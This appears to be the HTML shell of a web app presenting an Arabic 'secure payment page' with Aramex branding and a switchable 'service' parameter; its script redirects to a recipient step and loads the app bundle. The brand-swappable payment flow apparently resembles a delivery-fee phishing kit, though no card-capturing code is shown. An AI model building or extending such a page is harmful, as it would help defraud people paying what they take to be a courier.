<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>صفحة دفع آمنة - نظام دفع محمي</title>
    <meta name="description" content="صفحة دفع آمنة ومحمية - أكمل الدفع بشكل آمن وموثوق" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <meta property="og:title" content="صفحة دفع آمنة - نظام دفع محمي" />
    <meta property="og:description" content="صفحة دفع آمنة ومحمية - أكمل الدفع بشكل آمن وموثوق" />
    <meta property="og:image" content="/og-aramex.jpg" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:image" content="/og-aramex.jpg" />
</head>
<body style="margin: 0; padding: 0; background-color: #f5f5f5; font-family: 'Almarai', sans-serif;">
    <div id="root" style="min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; background-color: #f5f5f5;">
        <div style="background-color: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; width: 100%;">
            <div style="width: 60px; height: 60px; margin: 0 auto 20px; border: 4px solid #0EA5E9; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            <h1 style="color: #1a1a1a; margin: 0 0 12px 0; font-size: 24px;">صفحة دفع آمنة</h1>
            <p style="color: #666; margin: 0; font-size: 16px;">جاري تحميل صفحة الدفع...</p>
        </div>
    </div>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const service = urlParams.get('service') || 'aramex';
            const path = window.location.pathname;
            const payMatch = path.match(/\/pay\/([^\/\?]+)/);
            const payId = payMatch ? payMatch[1] : '';
            
            setTimeout(function() {
                if (payId && payId !== 'index') {
                    window.location.href = '/pay/' + payId + '/recipient?service=' + service;
                } else {
                    window.location.href = '/';
                }
            }, 100);
        })();
    </script>
    
    <script type="module" src="/src/main.tsx"></script>
</body>
</html>
